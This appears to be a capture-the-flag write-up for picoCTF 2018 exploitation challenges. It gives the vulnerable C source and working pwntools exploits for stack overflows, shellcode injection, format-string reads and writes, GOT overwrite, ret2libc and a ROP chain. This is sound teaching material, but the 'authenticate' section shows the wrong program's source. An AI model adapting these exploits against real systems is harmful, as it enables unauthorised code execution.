## Buffer overflow 0
Source code

```c
#include <stdio.h>                                                                                            
#include <stdlib.h>                                                                                           
#include <string.h>                                                                                           
#include <signal.h>                                                                                           
                                                                                                              
#define FLAGSIZE_MAX 64                                                                                       
                                                                                                              
char flag[FLAGSIZE_MAX];                                                                                      
                                                                                                              
void sigsegv_handler(int sig) {                                                                               
  fprintf(stderr, "%s\n", flag);                                                                              
  fflush(stderr);                                                                                             
  exit(1);                                                                                                    
}                                                                                                             
                                                                                                              
void vuln(char *input){                                                                                       
  char buf[16];                                                                                               
  strcpy(buf, input);                                                                                         
}                                                                                                             
                                                                                                              
int main(int argc, char **argv){                                                                              


  FILE *f = fopen("flag.txt","r");                                                                            
  if (f == NULL) {                                                                                            
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on
 the shell server.\n");                                                                                       
    exit(0);                                                                                                  
  }                                                                                                           
  fgets(flag,FLAGSIZE_MAX,f);                                                                                 
  signal(SIGSEGV, sigsegv_handler);                                                                           


  gid_t gid = getegid();                                                                                      
  setresgid(gid, gid, gid);                                                                                   


  if (argc > 1) {                                                                                             
    vuln(argv[1]);                                                                                            
    printf("Thanks! Received: %s", argv[1]);                                                                  
  }                                                                                                           
  else                                                                                                        
    printf("This program takes 1 argument.\n");                                                               
  return 0;                                                                                                   
}                                                                                                             
```

<br/>

Connect with ssh

```bash
$ ssh campeon33@2018shell4.picoctf.com
```

<br/>

Sending a lot of characters to cause a buffer overlfow:

```bash
$ cd /problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631
$ ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_b49d36d2}
```

<br/>

Now a python script that does everything:

```python
from pwn import *
import paramiko

user = 'yourusername'
password = 'yourpassword'
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run("sh")
p.sendline('cd /problems/buffer-overflow-0_4_ab1efebbee9446039487c64b88d38631 && ./vuln' + ' ' + 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
p.interactive()
```

<br/>

## Buffer overflow 1
Source code

```c
#include <stdio.h>                                                                                            
#include <stdlib.h>                                                                                           
#include <string.h>                                                                                           
#include <unistd.h>                                                                                           
#include <sys/types.h>                                                                                        
#include "asm.h"                                                                                              
                                                                                                              
#define BUFSIZE 32                                                                                            
#define FLAGSIZE 64                                                                                           
                                                                                                              
void win() {                                                                                                  
  char buf[FLAGSIZE];                                                                                         
  FILE *f = fopen("flag.txt","r");                                                                            
  if (f == NULL) {                                                                                            
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on
 the shell server.\n");                                                                                       
    exit(0);                                                                                                  
  }                                                                                                           
                                                                                                              
  fgets(buf,FLAGSIZE,f);                                                                                      
  printf(buf);                                                                                                
}                                                                                                             
                                                                                                              
void vuln(){                                                                                                  
  char buf[BUFSIZE];                                                                                          
  gets(buf);                                                                                                  
                                                                                                              
  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());               
}                                                                                                             
                                                                                                              
int main(int argc, char **argv){                                                                              
                                                                                                              
  setvbuf(stdout, NULL, _IONBF, 0);                                                                           


  gid_t gid = getegid();                                                                                      
  setresgid(gid, gid, gid);                                                                                   
                                                                                                              
  puts("Please enter your string: ");                                                                         
  vuln();                                                                                                     
  return 0;                                                                                                   
}                                                                                                             
```

<br/>

Connect with ssh

```
$ ssh campeon33@2018shell4.picoctf.com
$ /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba
```

<br/>

First let's generate a cyclic pattern

```python
$ python3
>>> from pwn import *
>>> cyclic(100)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
```

Now let's send it

```
$./vuln               
Please enter your string:                                                                                     
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa          
Okay, time to return... Fingers Crossed... Jumping to 0x6161616c                                              
Segmentation fault (core dumped)                                                                              
```

Finding the offset
```python
>>> cyclic_find(0x6161616c)
44
```

<br/>

Finding the address of the win function

```bash
$ (gdb) disass win
0x080485cb <+0>:     push   %ebp
```

<br/>

Sending the payload

```bash
$ python -c "from pwn import *; print 'A' * 44 + '\xcb\x85\x04\x08'" | ./vuln
```

<br/>

Now the python script

```python
from pwn import *
import paramiko

user = 'yourusername'
password = 'yourpassword'
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

payload = b'a'*44 + p32(0x080485cb)

p = s.run('cd /problems/buffer-overflow-1_2_86cbe4de3cdc8986063c379e61f669ba && ./vuln')
p.recvuntil('Please enter your string:')
p.sendline(payload)
p.interactive()
```

<br/>

## Buffer overflow 2

Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

<br/>

Connect with ssh

```bash
$ ssh campeon33@2018shell4.picoctf.com
$ cd /problems/buffer-overflow-2_0_738235740acfbf7941e233ec2f86f3b4/
```

<br/>

Now let's find the offset
I'll generate a cyclic pattern

```python
>>> from pwn import *
>>> cyclic(200)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
```

Now open it on gdb and set a breakpoint before the programs exits

```bash
$ gdb vuln
$ disass main
0x080486b1 <+68>:    push   $0x80487d1
   0x080486b6 <+73>:    call   0x8048460 <puts@plt>
   0x080486bb <+78>:    add    $0x10,%esp
   0x080486be <+81>:    call   0x8048646 <vuln>
   0x080486c3 <+86>:    mov    $0x0,%eax
   0x080486c8 <+91>:    mov    -0x4(%ebp),%ecx
   0x080486cb <+94>:    leave  
   0x080486cc <+95>:    lea    -0x4(%ecx),%esp
   0x080486cf <+98>:    ret
(gdb) break *0x080486cf
(gdb) r
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
```

Now the offset is:

```python
>>> cyclic_find(0x62616164)
112
```

<br/>

Now get the address the win function

```bash
$ objdump -t vuln | grep win
080485cb g     F .text  0000007b              win
```

<br/>

Now let's use pwntools to pass the arguments to little endian

```python
>>> p32(0x080485cb)
b'\xcb\x85\x04\x08'
>>> p32(0xdeadbeef)
b'\xef\xbe\xad\xde'
>>> p32(0xdeadc0de)
b'\xde\xc0\xad\xde'
```

<br/>

Send the payload

```bash
$ echo $(python -c "print 'A'*112  + '\xcb\x85\x04\x08' 'BBBB' + '\xef\xbe\xad\xde' +  '\xde\xc0\xad\xde'") | ./vuln
picoCTF{addr3ss3s_ar3_3asyada28e9b}Segmentation fault (core dumped)
```

<br/>

Now the python script

```python
from pwn import *
import paramiko

user = 'yourusername'
password = 'yourpassword'
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run('cd /problems/buffer-overflow-2_0_738235740acfbf7941e233ec2f86f3b4/ && ./vuln')

payload = b'a'*112
payload += p32(0x080485cb)
payload += b'bbbb'
payload += p32(0xdeadbeef)
payload += p32(0xdeadc0de)

p.recvuntil('Please enter your string:')
p.sendline(payload)
p.interactive()
```

<br/>

## leak-me

Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}


int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  // real pw: 
  FILE *file;
  char password[64];
  char name[256];
  char password_input[64];
  
  memset(password, 0, sizeof(password));
  memset(name, 0, sizeof(name));
  memset(password_input, 0, sizeof(password_input));
  
  printf("What is your name?\n");
  
  fgets(name, sizeof(name), stdin);
  char *end = strchr(name, '\n');
  if (end != NULL) {
    *end = '\x00';
  }

  strcat(name, ",\nPlease Enter the Password.");

  file = fopen("password.txt", "r");
  if (file == NULL) {
    printf("Password File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(password, sizeof(password), file);

  printf("Hello ");
  puts(name);

  fgets(password_input, sizeof(password_input), stdin);
  password_input[sizeof(password_input)] = '\x00';
  
  if (!strcmp(password_input, password)) {
    flag();
  }
  else {
    printf("Incorrect Password!\n");
  }
  return 0;
}
```

<br/>

Now only send lot of characters you can generate 500 with pwntools and cyclic()

```bash
$ nc 2018shell.picoctf.com 31045
What is your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```


<br/>

Now the the python script

```python
from pwn import *

p = remote('2018shell.picoctf.com',31045)

p.recvuntil('What is your name?')
p.sendline(b'a'*500)
p.interactive()
```

<br/>

## shellcode

Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();
     
  return 0;
}
```

Connect with ssh

```bash
$ ssh campeon33@2018shell4.picoctf.com
$ cd /problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd
```

<br/>

Now send the shellcode

```bash
$ (python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'"; cat) | ./vuln
cat flag.txt
```

<br/>

Now the python script

```python
from pwn import *
import paramiko

user = 'youruser'
password = 'yourpassword'
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run('cd /problems/shellcode_4_99838609970da2f5f6cf39d6d9ed57cd && ./vuln')

payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

p.recvuntil('Enter a string!')
p.sendline(payload)
p.sendline('cat flag.txt')
p.interactive()
```

<br/>

## authenticate

Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

void win() {
  system("/bin/sh");
}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[256];
  
  unsigned int address;
  unsigned int value;

  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");

  scanf("%x", &address);

  sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
  puts(buf);
  
  scanf("%x", &value);

  sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
  puts(buf);

  *(unsigned int *)address = value;

  puts("Okay, exiting now...\n");
  exit(1);
  
}
```

So we have to change the value of the authenticated variable I'll use GDB

```bash
$ gdb auth
gef➤  disass main
.......................
0x080487f9 <+220>:   call   0x80484b0 <printf@plt>
.......................
gef➤  break *0x080487f9                                                      
Breakpoint 1 at 0x80487f9
gef➤  r                                                                      
Starting program: /home/c3t/ctf/picoctf/picoctf-2018/pwn/auth                
Would you like to read the flag? (yes/no)
AAAABBBB.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
gef➤  x &authenticated
0x804a04c <authenticated>:      0x00000000
gef➤  x/12wx $esp                                                            
0xffffd0a0:     0xffffd0cc      0x080489a6      0xf7fb3580      0x0804875a   
0xffffd0b0:     0x00000000      0x00000000      0xf7ffd000      0xffffd1c4   
0xffffd0c0:     0x00000000      0x00000534      0x000003e8      0x41414141
```

So the AAAA is in the 11th position, now we can send as payload 0x804a04c + %11$n

<br/>

And here's the script

```python
from pwn import *

host = '2018shell.picoctf.com'
port = 43438

p = remote(host,port)


p.recvuntil('Would you like to read the flag? (yes/no)')
p.sendline(p32(0x804a04c) + b'%11$n')
p.interactive()
```

<br/>

## echooo

Source code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  char flag[64];
  char *flag_ptr = flag;
  
  // Set the gid to the effective gid
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  memset(buf, 0, sizeof(flag));
  memset(buf, 0, sizeof(buf));

  puts("Time to learn about Format Strings!");
  puts("We will evaluate any format string you give us with printf().");
  puts("See if you can get the flag!");
  
  FILE *file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  
  fgets(flag, sizeof(flag), file);
  
  while(1) {
    printf("> ");
    fgets(buf, sizeof(buf), stdin);
    printf(buf);
  }  
  return 0;
}
```

<br/>

The line printf(buf); is vulnerable to format strings, let's try to leak address of the stack with %x
```bash
$ nc 2018shell.picoctf.com 46960
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %x %x %x %x %x %x %x 
40 f774b5a0 8048647 f7783a74 1 f775b490 ff90de84
```

<br/>

So, now we have to leak a string so I'll use %s, but if we send too much %s it will cause a segfault, so ill use %<number>$s, but i don't know the the position where the strings is, so i'll bruteforce it. Here the script

<br/>

```python
from pwn import *

host = '2018shell.picoctf.com'
port = 46960

#p = remote(host,port)

for i in range(10):
    p = remote(host,port)
    p.recvuntil('> ')
    p.sendline('%'+str(i)+'$s')
    print(p.recv())
```

<br/>

## got shell

Source code

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

void win() {
  system("/bin/sh");
}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[256];
  
  unsigned int address;
  unsigned int value;

  puts("I'll let you write one 4 byte value to memory. Where would you like to write this 4 byte value?");

  scanf("%x", &address);

  sprintf(buf, "Okay, now what value would you like to write to 0x%x", address);
  puts(buf);
  
  scanf("%x", &value);

  sprintf(buf, "Okay, writing 0x%x to 0x%x", value, address);
  puts(buf);

  *(unsigned int *)address = value;

  puts("Okay, exiting now...\n");
  exit(1);
  
}
```

<br/>

So let's use pwntools with a script to get the address of GOT exit, and the address of the win function

```python
from pwn import *

host = '2018shell.picoctf.com'
port = 27952

elf = ELF('./auth')
p = remote(host,port)

p.recvuntil('Where would you like to write this 4 byte value?')
p.sendline(hex(elf.got['exit']))
p.recvline('Okay, now what value would you like to write to 0xeee')
p.sendline(hex(elf.symbols['win']))
p.sendline('cat flag.txt')
p.interactive()
```

<br/>

## got to learn libc

Source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

char useful_string[16] = "/bin/sh"; /* Maybe this can be used to spawn a shell? */


void vuln(){
  char buf[BUFSIZE];
  puts("Enter a string:");
  gets(buf);
  puts(buf);
  puts("Thanks! Exiting now...");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  puts("Here are some useful addresses:\n");

  printf("puts: %p\n", puts);
  printf("fflush %p\n", fflush);
  printf("read: %p\n", read);
  printf("write: %p\n", write);
  printf("useful_string: %p\n", useful_string);

  printf("\n");
  
  vuln();

  
  return 0;
}
```

<br/>

Let's connect with ssh
```bash
$ ssh campeon33@2018shell4.picoctf.com
$ cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee
```

<br/>

Let's start by finding the offset
```bash
$ gdb vuln
(gdb) break main
(gdb) r
(gdb) p puts
$1 = {<text variable, no debug info>} 0xf7641150 <puts>
(gdb) p system
$2 = {<text variable, no debug info>} 0xf761c950 <system>
(gdb) p 0xf7641150 - 0xf761c950
$3 = 149504
```
The the offset is puts - system, that equals = 149504

<br/>

The system address is puts address - offset


<br/>

With this we can make the exploit

```python
from pwn import * 
import paramiko
                                       
user = 'youruser' 
password = 'yourpassword'
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run('cd /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee && ./vuln')

p.recvuntil("puts: ")
puts_addr = int(p.recvline(),16)

p.recvuntil("flush")
flush_addr = int(p.recvline(),16)

p.recvuntil("read:")
read_addr = int(p.recvline(),16)

p.recvuntil("write:")
write_addr = int(p.recvline(),16)

p.recvuntil("useful_string: ")
binsh = int(p.recvline(),16)


# p puts - system
offset = 149504
sys_addr = puts_addr - offset
padding = b'A'*160
payload = padding
payload += p32(sys_addr)
payload += b'bbbb'
payload += p32(binsh)


p.recvuntil("Enter a string:")
p.sendline(payload)
p.interactive()
```

<br/>

## rop chain

Source code

```c
#include <stdio.h>                                                                          
#include <stdlib.h>
#include <string.h>
#include <unistd.h>                               
#include <sys/types.h>                                                                              #include <stdbool.h>
                         
#define BUFSIZE 16                                
                                                  
bool win1 = false;
bool win2 = false;
                                                                                                    
                         
void win_function1() {
  win1 = true;
}            
                         
void win_function2(unsigned int arg_check1) {
  if (win1 && arg_check1 == 0xBAAAAAAD) {
    win2 = true;
  }
  else if (win1) {                                
    printf("Wrong Argument. Try Again.\n");
  }                                               
  else {
    printf("Nope. Try a little bit harder.\n");
  }                                                                                                 
}                       
                                                  
void flag(unsigned int arg_check2) {
  char flag[48];
  FILE *file;                                                                                       
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
   
  if (win1 && win2 && arg_check2 == 0xDEADBAAD) {
    printf("%s", flag);
    return;
}
  else if (win1 && win2) {
    printf("Incorrect Argument. Remember, you can call other functions in between each win function!
\n");
  }
  else if (win1 || win2) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
   
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```

<br/>

Finding the offset

```bash
gef➤  disass main
Dump of assembler code for function main:                                             
   0x0804873b <+0>:     lea    ecx,[esp+0x4]                                          
   0x0804873f <+4>:     and    esp,0xfffffff0                                         
   0x08048742 <+7>:     push   DWORD PTR [ecx-0x4]                                    
   0x08048745 <+10>:    push   ebp                                                    
   0x08048746 <+11>:    mov    ebp,esp                                                
   0x08048748 <+13>:    push   ecx                                                    
   0x08048749 <+14>:    sub    esp,0x14                                               
   0x0804874c <+17>:    mov    eax,ds:0x804a03c                                       
   0x08048751 <+22>:    push   0x0                                                    
   0x08048753 <+24>:    push   0x2                                                    
   0x08048755 <+26>:    push   0x0                                                    
   0x08048757 <+28>:    push   eax                                                    
   0x08048758 <+29>:    call   0x8048490 <setvbuf@plt>                                
   0x0804875d <+34>:    add    esp,0x10                                               
   0x08048760 <+37>:    call   0x8048450 <getegid@plt>                                
   0x08048765 <+42>:    mov    DWORD PTR [ebp-0xc],eax                                
   0x08048768 <+45>:    sub    esp,0x4                                                
   0x0804876b <+48>:    push   DWORD PTR [ebp-0xc]                                    
   0x0804876e <+51>:    push   DWORD PTR [ebp-0xc]                                    
   0x08048771 <+54>:    push   DWORD PTR [ebp-0xc]                                    
   0x08048774 <+57>:    call   0x80484b0 <setresgid@plt>                              
   0x08048779 <+62>:    add    esp,0x10                                               
   0x0804877c <+65>:    call   0x8048714 <vuln>                                       
   0x08048781 <+70>:    mov    eax,0x0                                                
   0x08048786 <+75>:    mov    ecx,DWORD PTR [ebp-0x4]                                
   0x08048789 <+78>:    leave                                                         
   0x0804878a <+79>:    lea    esp,[ecx-0x4]                                          
   0x0804878d <+82>:    ret                                                           
End of assembler dump.                                                                
gef➤  pattern create 100                                                              
[+] Generating a pattern of 100 bytes                                                 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava
aawaaaxaaayaaa
gef➤  break *0x0804878d                                                               
Breakpoint 1 at 0x804878d                                                             
gef➤  r                                                                               
Starting program: /home/c3t/ctf/picoctf/picoctf-2018/pwn/rop                          
Enter your input> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaa
raaasaaataaauaaavaaawaaaxaaayaaa                                                      
                                                                                      
Program received signal SIGSEGV, Segmentation fault.
[#0] Id 1, Name: "rop", stopped 0x61616168 in ?? (), reason: SIGSEGV
gef➤  pattern search 0x61616168
[+] Searching '0x61616168'
[+] Found at offset 28 (little-endian search) likely
```

Now, for exploit this will be:

<br/>

offset + win1 address + win2 address + gadget + arg 1 + flag address + gadget + arg 2

<br/>

Let's find the addresses with radare2

```bash
[0x080484d0]> s @ sym.win_function1 
0x80485cb
[0x080484d0]> s @ sym.win_function2
0x80485d8
[0x080484d0]> s @ sym.flag
0x804862b
```

<br/>

Now we have to find the pop and ret gadgets I'll use radare2, but there are automatized tools

```bash
[0x080484d0]> /R pop; ret;
0x0804840b               c408  les ecx, [eax]         
0x0804840d                 5b  pop ebx                                              
0x0804840e                 c3  ret
```

<br/>

Now let's make the script

```python
from pwn import *

user = ''
password = ''
host = '2018shell4.picoctf.com'

s = ssh(user=user,password=password,host=host)

p = s.run('cd /problems/rop-chain_3_f91334c5acb91bde3de858eb8045928a && ./rop')

payload = b'a'*28
payload += p32(0x80485cb)
payload += p32(0x80485d8)
payload += p32(0x0804840d)
payload += p32(0xBAAAAAAD)
payload += p32(0x804862b)
payload += p32(0x0804840d)
payload += p32(0xDEADBAAD)

p.recvuntil('Enter your input>')
p.sendline(payload)
p.interactive()
```
